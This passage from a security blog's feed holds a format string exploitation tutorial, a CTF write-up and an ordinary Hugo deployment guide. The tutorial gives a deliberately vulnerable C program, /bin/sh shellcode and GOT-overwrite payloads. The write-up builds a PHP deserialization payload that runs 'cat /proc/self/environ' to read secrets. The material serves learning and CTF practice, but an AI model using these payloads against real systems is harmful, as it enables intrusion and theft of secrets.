&lt;p&gt;If we run it, the output will be &lt;code&gt;hello 3 7&lt;/code&gt;. The parameters are pushed
into the stack in reverse order. It pushes the 7, the 3, and the address
of the format string. However, if we remove the 7 and rerun it, we will
see something like &lt;code&gt;hello 3 0xbfffff8b&lt;/code&gt;. The format string will get the
data from where the argument should have been placed. In that case, from
the first address below the stack frame.&lt;/p&gt;
&lt;h1&gt;Format String vulnerability demo&lt;/h1&gt;
&lt;p&gt;All the vulnerable programs are from Hacking: The Art of Exploitation,
2nd Edition. You can get the original source code
&lt;a href=&quot;https://github.com/intere/hacking/blob/master/booksrc&quot;&gt;https://github.com/intere/hacking/blob/master/booksrc&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;

   if(argc &amp;lt; 2) {
      printf(&quot;Usage: %s &amp;lt;text to print&amp;gt;\n&quot;, argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf(&quot;The right way to print user-controlled input:\n&quot;);
   printf(&quot;%s&quot;, text);


   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);
   printf(text);

   printf(&quot;\n&quot;);

   // Debug output
   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;amp;test_val, test_val, test_val);

   exit(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The code is quite self-explanatory. The vulnerable line of code is:
&lt;code&gt;printf(text)&lt;/code&gt;. Notice that it will print whatever the user feeds to it
as input. We can pass any format string that we want. Before continuing,
let&apos;s see how to compile the program.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc fmt_vuln.c -o fmt.out -fno-stack-protector -no-pie -m32
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-fno-stack-protector&lt;/code&gt; to disable canaries&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-no-pie&lt;/code&gt; to disable Position Independent Executable&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-m32&lt;/code&gt; to compile it as a 32 bit binary&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&apos;s continue with the exploit. The following image shows two
executions.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/print-input-vuln.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The first executions gets &lt;code&gt;&quot;something&quot;&lt;/code&gt; as input. The output is the
expected one. The interesting part is in the second execution, where we
pass &lt;code&gt;$(printf &quot;\x2c\xc0\x04\x08&quot;).%08x.%08x.%08x.%n&lt;/code&gt; as input (the dots
are just to make the output clearer). As a result, we overwrite the
&lt;code&gt;test_val&lt;/code&gt; variable. How is that possible? Let&apos;s see. The format string
is crafted to accomplish three things. First, we push the &lt;code&gt;test_val&lt;/code&gt;
memory address into the stack with &lt;code&gt;$(printf &quot;\x2c\xc0\x04\x08&quot;)&lt;/code&gt;.
Second, we read memory address until we reach the data we inserted at
the beginning of the format string with &lt;code&gt;%08x.%08x.%08x&lt;/code&gt;. I didn&apos;t know
beforehand that I needed to read three addresses, I checked it manually.
Third and last, we overwrite the data in &lt;code&gt;test_val&lt;/code&gt; with the number of
characters printed by printf with &lt;code&gt;%n&lt;/code&gt;. For clarification, when we call
&lt;code&gt;%n&lt;/code&gt;, we already traversed all the memory addresses until the one
containing &lt;code&gt;\x2c\xc0\x04\x08&lt;/code&gt;. Therefore, &lt;code&gt;%n&lt;/code&gt; overwrites the data in
that memory address, which happens to be &lt;code&gt;test_val&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Similarly, if we increment the width of some of the format string
parameters, we can overwrite &lt;code&gt;test_val&lt;/code&gt; with higher values.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/print-input-vuln-400.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That&apos;s seemingly stupid thing is really powerful. We can overwrite
memory addresses with whatever value we want (e.g another memory
address). That&apos;s the idea of the exploit. Let&apos;s jump to the following
exercise.&lt;/p&gt;
&lt;h1&gt;Write to memory address&lt;/h1&gt;
&lt;p&gt;In that first exercise, we will see how to overwrite the value with the
memory address &lt;code&gt;ddccbbaa&lt;/code&gt;. Of course, you can follow these steps to
overwrite it with any other memory address of your liking. The only
prerequisite is that the hexadecimal values of each byte must be greater
than the value of the following one.&lt;/p&gt;
&lt;p&gt;To write &lt;code&gt;ddccbbaa&lt;/code&gt;, we need go byte by byte. We cannot write them at
once. That means that &lt;code&gt;$(printf &quot;\x2c\xc0\x04\x08&quot;)&lt;/code&gt; won&apos;t be enough. We
need to push the following three memory addresses into the stack. We can
do that with something like
&lt;code&gt;$(printf &quot;{address 1}{address 2}{address 3}{address 4}&quot;)&lt;/code&gt;. Besides, we
also need to overwrite them. For example,
&lt;code&gt;$(printf &quot;{address 1}{address 2}{address 3}{address 4}&quot;).%08x.%08x.%{number 1}x%n%{number 2}x%n%{number 3}x%n%{number 4}%n&lt;/code&gt;,
where each &lt;code&gt;%{number}%n&lt;/code&gt; is overwriting one byte. There&apos;s one issue,
though. We must add 4 bytes between each memory address so that each
&lt;code&gt;%n&lt;/code&gt; overwrites the correct memory address. Remember, each format
parameter is reading a memory address from the stack. If we don&apos;t add 4
bytes between each address, the &lt;code&gt;%{number}x&lt;/code&gt; would read one of the
memory addresses we want to overwrite. Thus, we want something similar
to
&lt;code&gt;$(printf &quot;{address 1}JUNK{address 2}JUNK{address 3}JUNK{address 4}&quot;).%08x.%08x.%{number 1}x%n%{number 2}x%n%{number 3}x%n%{number 4}%n&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Great! We have the structure, but how do we compute the numbers for each
&lt;code&gt;%x&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;For the firts byte, we want to execute the command&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./fmt.out $(printf &quot;\x2c\xc0\x04\x08JUNK\x2d\xc0\x04\x08JUNK\x2e\xc0\x04\x08JUNK\x2f\xc0\x04\x08&quot;).%08x.%08x.%08x.%n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which will give us the value of &lt;code&gt;test_val&lt;/code&gt; (56). With that, we can
compute the first number with the formula &quot;expected value - initial
value + 8&quot;. That will give us the distance from the actual value stored
in the variable to the value we want. The &quot;+ 8&quot; comes from the 8 digits
we are inserting in the &lt;code&gt;%08x&lt;/code&gt; that appears before &lt;code&gt;%n&lt;/code&gt;. We can compute
this with gdb.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb -q --batch --ex &quot;p 0xaa - 56 + 8&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we can execute the following to get the first byte.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/first-byte.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;For the following bytes, we have to do the same. However, to compute the
numbers, we will use the formula &quot;expected value - previous written
value&quot;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/ddccbbaa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Awesome! We know how to overwrite memory addresses, but we are rather
limited. The bytes must be ordered in descending value. What if we want
to write any arbitrary memory address? We cannot do something like
&lt;code&gt;%-10x%n&lt;/code&gt;. What do we do in those situations?&lt;/p&gt;
&lt;h1&gt;Write arbitrary bytes to memory address&lt;/h1&gt;
&lt;p&gt;The solution for that is straigth forward. We want to &quot;wrap&quot; the smaller
byte. In other words, instead of computing &quot;expected value - previous
written value&quot; we will compute &quot;1(expected value) - previous written
value&quot; (e.g. 0x1aa - 0xbb given that we want to write 0xaa). The
procedure stays the same.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/aaccaabb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Amazing! But this is to much work, can&apos;t we simplify it a little bit?&lt;/p&gt;
&lt;h1&gt;Direct access and short writes&lt;/h1&gt;
&lt;p&gt;There are two ways to simplify the process. First, we can use direct
access to avoid writing numerous format parameters. We can use &lt;code&gt;%n$d&lt;/code&gt;
where &lt;code&gt;%n&lt;/code&gt; indicates the argument position and &lt;code&gt;$d&lt;/code&gt; indicates the format
parameter type.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/direct-access.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can simplify what we did in the previous section. Be aware that the
structure changes a bit. We want to use
&lt;code&gt;$(printf &quot;{address 1}{address 2}{address 3}{address 4}&quot;)%{number 1}x%4\$n%{number 2}x%5\$n%{number 3}x%6\$n%{number 4}x%7\$n%&lt;/code&gt;.
Notice that we no longer need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the padding between memory addresses&lt;/li&gt;
&lt;li&gt;to add 8 when computing the first value&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/direct-access-aaccaabb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;But that&apos;s not all. We can also use short writes to write two bytes at
once. We need to use &lt;code&gt;%n$hd&lt;/code&gt;, remove the second and fourth memory
addresses, and compute the new values.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/short-write.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/short-write-result.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Pretty neat, eh? With that knowledge, we could get a shell if we wanted
to.&lt;/p&gt;
&lt;h1&gt;Overwrite Global Offset Table to get a shell&lt;/h1&gt;
&lt;p&gt;The Global Offset Table (GOT) is a section of a computer program that
holds the memory addresses of functions that are dinamically linked.
It&apos;s useful to call functions from shared libraries. We will rewrite a
memory address there with the address of our shellcode, but first, let&apos;s
see how to compile the program.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc fmt_vuln.c -o fmt.out -fno-stack-protector -no-pie -z norelro -z execstack -m32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Notice that we added &lt;code&gt;-z norelro&lt;/code&gt; to allow overwriting memory addresses
in the GOT, and &lt;code&gt;-z execstack&lt;/code&gt; to require executable stack.&lt;/p&gt;
&lt;p&gt;We also need to disable the Adress Space Layout Randomization (ASLR) to
avoid random memory addreses.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, the idea is pretty simple. We want to overwrite the memory address
of the &lt;code&gt;exit&lt;/code&gt; function in the GOT table. For that, we will need a couple
of things.&lt;/p&gt;
&lt;p&gt;We need a 32 bits shellcode. We can get one with the following C
program. I got it from &lt;a href=&quot;https://shell-storm.org/&quot;&gt;https://shell-storm.org/&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

char *shellcode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;
  &quot;\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;

int main(void)
{
  fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
  (*(void(*)()) shellcode)();
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We also need a program to get the shellcode address. We will store in an
environment variable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
  char *ptr;

  if(argc &amp;lt; 3) {
    printf(&quot;Usage: %s &amp;lt;environment variable&amp;gt; &amp;lt;target program name&amp;gt;\n&quot;, argv[0]);
    exit(0);
  }
  ptr = getenv(argv[1]); /* get env var location */
  ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
  printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;From that point, the procedure is pretty straight forward.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Store shellcode in an environment variable&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export SHELLCODE=$(cat shellcode.bin)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get shellcode address&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./getenv.out SHELLCODE ./fmt.out 
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compute the values we will put at the format string exploit for the
given shellcode address&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb -q --batch --ex &quot;p 0xffff - 8&quot;
# 65527
gdb -q --batch --ex &quot;p 0x1d9b8 - 0xffff&quot;
# 55737
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get &lt;code&gt;exit&lt;/code&gt; address in GOT&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/got-table.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Exploit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./fmt.out $(printf &quot;\x7a\xb2\x04\x08\x78\xb2\x04\x08&quot;)%65527x%4\$hn%55737x%5\$hn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/format_string_vuln/shell-execution.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Don&apos;t execute format string inputted by the users. Thanks. That will
save you lots of headaches.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/format-string-vuln.DlCIcyQp.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep001 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch03/</guid><description>Reverse engineer your way through H4ck1ng G00gl3 ep001 challenge 03. Exploit PHP serialization and directory traversal to uncover and decode the flag.</description><pubDate>Fri, 28 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
challenge 03&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After opening the challenge, we see a chess website similar to the one
in the ep000 ch01.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/chess.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Notice that now there is no link to the admin panel. We have to find
another vulnerability. I checked the website source code and found the
&lt;strong&gt;load_baseboard&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/load_board_code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This function returns the contents of the &quot;baseboard.fen&quot; file after a
POST request to &lt;strong&gt;load_board.php&lt;/strong&gt;. I tried a couple of things at this
point. Firstly, I tried to load a custom fen file with a winning state
for me. Secondly, I tried to get the output of a file in the system with
a &lt;strong&gt;directory traversal attack&lt;/strong&gt;. I was not lucky. After thinking some
time, I tried to get the source code of the &lt;strong&gt;index.php&lt;/strong&gt; file with a
POST to the &lt;strong&gt;load_board.php&lt;/strong&gt;. It worked!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/index_code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I have been looking at the &lt;strong&gt;index.php&lt;/strong&gt; code for hours. The only
interesting thing I saw was the following hint:
&lt;code&gt;&quot;Winning against me won&apos;t help anymore. You need to get the flag from my envs.&quot;&lt;/code&gt;.
Other than that, I could not find where the vulnerability was. I asked
the community for a hint. They told me that &lt;strong&gt;unserialize&lt;/strong&gt; is the
vulnerable function. With that information, I decided to first learn
about PHP serialization. This
&lt;a href=&quot;https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a&quot;&gt;page&lt;/a&gt;
explains how it works and how to exploit it. In our case, we need a
vulnerable PHP class with the magic method &lt;strong&gt;__wakeup&lt;/strong&gt; which gets
executed after calling &lt;strong&gt;unserialize&lt;/strong&gt;. The class named &lt;strong&gt;Stockfish&lt;/strong&gt; of
&lt;strong&gt;index.php&lt;/strong&gt; has it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Stockfish
{
    public $cwd = &quot;./&quot;;
    public $binary = &quot;/usr/games/stockfish&quot;;
    public $other_options = array(&apos;bypass_shell&apos; =&amp;gt; &apos;true&apos;);
    public $descriptorspec = array(
        0 =&amp;gt; array(&quot;pipe&quot;,&quot;r&quot;),
        1 =&amp;gt; array(&quot;pipe&quot;,&quot;w&quot;),
    );
    private $process;
    private $pipes;
    private $thinking_time;

    ...

    public function __wakeup()
    {
        $this-&amp;gt;process = proc_open($this-&amp;gt;binary, $this-&amp;gt;descriptorspec, $this-&amp;gt;pipes,
                                   $this-&amp;gt;cwd, null, $this-&amp;gt;other_options) ;
        echo &apos;&amp;lt;!--&apos;.&apos;wakeupcalled&apos;.fgets($this-&amp;gt;pipes[1], 4096).&apos;--&amp;gt;&apos;;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the snippet above, we can see the code that will get executed once
&lt;strong&gt;unserialize&lt;/strong&gt; is called. It will execute a binary. We could exploit it
by passing a serialized &lt;strong&gt;Stockfish&lt;/strong&gt; object with a different binary
that showed us the environment variables. That is the place where the
flag is supposed to be.
&lt;code&gt;&quot;Winning against me won&apos;t help anymore. You need to get the flag from my envs.&quot;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Where is the &lt;strong&gt;unserialize&lt;/strong&gt; called? How should we pass the data? In the
&lt;strong&gt;index.php&lt;/strong&gt;, we can see that the &lt;strong&gt;unserialize&lt;/strong&gt; method is called when
a GET HTTP call is done to &lt;strong&gt;move_end&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;} elseif (isset($_GET[&apos;move_end&apos;])) {
    $movei = unserialize(base64_decode($_GET[&apos;move_end&apos;]));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have to send the payload to
&lt;a href=&quot;https://hackerchess2-web.h4ck.ctfcompetition.com?move_end=payload&quot;&gt;https://hackerchess2-web.h4ck.ctfcompetition.com?move_end=payload&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The last step is generating the payload. We can copy the Stockfish code
in our computer and change the &lt;strong&gt;binary&lt;/strong&gt; variable to have the value
&lt;strong&gt;&quot;cat /proc/self/environ&quot;&lt;/strong&gt;. That will print the environment variables.
Finally, we have to serialize and encode it in base64.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$stockf = new Stockfish();
echo base64_encode(serialize($stockf));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally, we only need to launch the HTTP request and search for the flag
in the output.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/unserialize_exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Deploy blog written with org-mode on GitHub Pages</title><link>https://danielorihuela.dev/blog/deploy-blog-written-with-org-mode-on-github-pages/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/deploy-blog-written-with-org-mode-on-github-pages/</guid><description>Join me on my adventure to crafting a personal blog with Hugo, GitHub Pages, and GitHub Actions. Learn how to use these tools to create and deploy your own site effortlessly.</description><pubDate>Sun, 03 Jul 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#context&quot;&gt;Context&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#goal-expected-final-workflow&quot;&gt;Goal (expected final workflow)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#steps&quot;&gt;Steps&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#create-github-repository&quot;&gt;Create GitHub repository&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#upload-hugo-configuration&quot;&gt;Upload Hugo configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#create-github-action-workflow&quot;&gt;Create GitHub Action workflow&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Context&lt;/h1&gt;
&lt;p&gt;I have been using emacs to write in org-mode for some time now. I love
it. So, I decided to start writing a personal blog with it. However, I
did not have the tool to create the blog and the means to publish it. I
selected a static site generator (SSG) called Hugo for my first problem.
It is well known for its simplicity and speed of building sites. For my
second issue, I selected GitHub Pages + Github Actions. It seemed the
easiest way to have a repository with my code and CI/CD pipelines to
generate and deploy the site.&lt;/p&gt;
&lt;h1&gt;Goal (expected final workflow)&lt;/h1&gt;
&lt;p&gt;The final workflow should eliminate the need to: manually generate the
site and deploy it. We should only focus on the content. That is,
writing the posts with org-mode.&lt;/p&gt;
&lt;p&gt;After following this guide, we will deploy our site with the following
steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Write a post in org-mode&lt;/li&gt;
&lt;li&gt;Push the new posts to the repository&lt;/li&gt;
&lt;li&gt;Nothing. Wait until GitHub Actions automagically generates and
deploys your site&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;Steps&lt;/h1&gt;
&lt;h2&gt;Create GitHub repository&lt;/h2&gt;
&lt;p&gt;First, we need to &lt;a href=&quot;https://docs.github.com/en/pages/getting-started-with-github-pages/creating-a-github-pages-site&quot;&gt;create a GitHub repository for our
site&lt;/a&gt;.
In the following list, we can see the configuration.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The repository name must be &lt;code&gt;user.github.io&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The repository visibility must be public&lt;/li&gt;
&lt;li&gt;Branch for the generated site, &quot;main&quot; in our case&lt;/li&gt;
&lt;li&gt;Branch for the source code and org-mode files, &quot;development&quot; in our
case&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Upload Hugo configuration&lt;/h2&gt;
&lt;p&gt;Once the repository is ready, we can upload our Hugo configuration to
the development branch. The &lt;a href=&quot;https://gohugo.io/getting-started/directory-structure/&quot;&gt;Hugo directory
structure&lt;/a&gt; looks
like the tree below. However, we do not need the &lt;code&gt;content&lt;/code&gt; folder. It
will be auto-generated with &lt;strong&gt;ox-hugo&lt;/strong&gt;. Instead, we will have a folder
named &lt;code&gt;posts&lt;/code&gt; with the org-mode files.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.
+-- archetypes
+-- config.toml
+-- posts
+-- data
+-- layouts
+-- static
+-- themes
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Create GitHub Action workflow&lt;/h2&gt;
&lt;p&gt;Now, with the Hugo configuration and org-mode posts in the repository,
we only have left to create the deployment workflow. We need a GitHub
Action that performs the steps below. The code you will find in this
section is a modified version of the code at
&lt;a href=&quot;https://github.com/ayrat555/braindump&quot;&gt;https://github.com/ayrat555/braindump&lt;/a&gt;. The creator of the repo wrote a
post explaining how he &lt;a href=&quot;https://www.badykov.com/emacs/generating-site-from-org-mode-files/#conclusion&quot;&gt;deploys the notes he takes with org
roam&lt;/a&gt;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Checkout repository code&lt;/p&gt;
&lt;p&gt;We need access to the code to execute a bash script later.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- uses: actions/checkout@v3
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Install emacs&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- name: Install emacs
  uses: purcell/setup-emacs@master
        with:
          version: &apos;27.1&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Transform org-mode files to markdown with &lt;strong&gt;ox-hugo&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- name: Convert org files to hugo
  run: ./org2hugo.sh
  shell: bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The bash script is a wrapper to call an elisp function. We export
some environment variables, copy the elisp file and execute the
&lt;code&gt;build/export-all&lt;/code&gt; function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

export HUGO_BASE_DIR=`pwd`
export POSTS_ORG_SRC=`pwd`/posts
HOME=/tmp/emacs-build

mkdir -p $HOME
cp -r `pwd`/init.el $HOME

emacs -Q --batch --load $HOME/init.el --execute &quot;(build/export-all)&quot; --kill
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The elisp code is also simple. At a high level, we are just
downloading the &lt;strong&gt;ox-hugo&lt;/strong&gt; package and defining the
&lt;code&gt;build/export-all&lt;/code&gt; function. And what does that function? Well. That
function retrieves all the org-mode files from the &lt;code&gt;posts&lt;/code&gt; folder
and exports them to markdown. The result will be in
&lt;code&gt;contents/posts&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(setq make-backup-files nil) ;; Disable &quot;&amp;lt;file&amp;gt;~&quot; backups.

(defconst posts-org-files (getenv &quot;POSTS_ORG_SRC&quot;))

;; Setup packages using straight.el: https://github.com/raxod502/straight.el
(defvar bootstrap-version)
(let ((bootstrap-file
       (expand-file-name &quot;straight/repos/straight.el/bootstrap.el&quot; user-emacs-directory))
      (bootstrap-version 5))
  (unless (file-exists-p bootstrap-file)
    (with-current-buffer
        (url-retrieve-synchronously
         &quot;https://raw.githubusercontent.com/raxod502/straight.el/develop/install.el&quot;
         &apos;silent &apos;inhibit-cookies)
      (goto-char (point-max))
      (eval-print-last-sexp)))
  (load bootstrap-file nil &apos;nomessage))

(setq straight-use-package-by-default t)
(straight-use-package &apos;use-package)

(use-package ox-hugo
  :straight (:type git :host github :repo &quot;kaushalmodi/ox-hugo&quot;))

;;; Public functions
(defun build/export-all ()
  &quot;Export all org-files (including nested) under posts-org-files.&quot;

  (setq org-hugo-base-dir (getenv &quot;HUGO_BASE_DIR&quot;))
  (setq org-hugo-section &quot;posts&quot;)

  (dolist (org-file (directory-files-recursively posts-org-files &quot;\.org$&quot;))
    (with-current-buffer (find-file org-file)
      (org-hugo-export-wim-to-md :all-subtrees nil nil nil)))

  (message &quot;Done!&quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Build site with &lt;strong&gt;hugo&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;By default, the result will be in a folder named &lt;code&gt;public&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- name: Setup Hugo
  uses: peaceiris/actions-hugo@v2
  with:
    hugo-version: &apos;0.91.2&apos;

- name: Build
  run: hugo --minify
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Publish the site to &lt;strong&gt;GitHub Pages&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We publish the contents of the &lt;code&gt;public&lt;/code&gt; folder in the main branch.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- name: Deploy
  uses: peaceiris/actions-gh-pages@v3
  if: ${{ github.ref == &apos;refs/heads/development&apos; }}
  with:
    github_token: ${{ secrets.GITHUB_TOKEN }}
    publish_branch: main
    publish_dir: ./public
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Once we have created the three files, we can upload them to the
&lt;code&gt;development&lt;/code&gt; branch. From now on, every time you push new org-mode
